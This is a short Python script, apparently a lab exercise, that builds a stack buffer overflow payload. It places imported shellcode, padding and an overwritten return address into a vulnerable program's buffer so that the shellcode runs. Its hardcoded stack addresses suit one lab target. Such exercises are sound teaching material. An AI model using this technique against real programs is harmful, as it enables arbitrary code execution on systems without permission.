#!/usr/bin/env python3
from shellcode import shellcode
import sys

"""
Shellcode Injection Demonstration
----------------------------------

This script constructs a payload that injects shellcode into memory
and redirects execution to it via a return address overwrite.
""" 

# buf relative to base pointer is: rbp-0x70
# padding = 0x7ffffff29258 - 0x7ffffff291e0
# 0x7ffffff291e0 = rbp-0x70 (starting address of buf)
# 0x7ffffff29258 = return address of stack
padding = 120 - len(shellcode)

sys.stdout.buffer.write(shellcode + b"A" * padding + 0x7ffffff291e0.to_bytes(8, "little"))

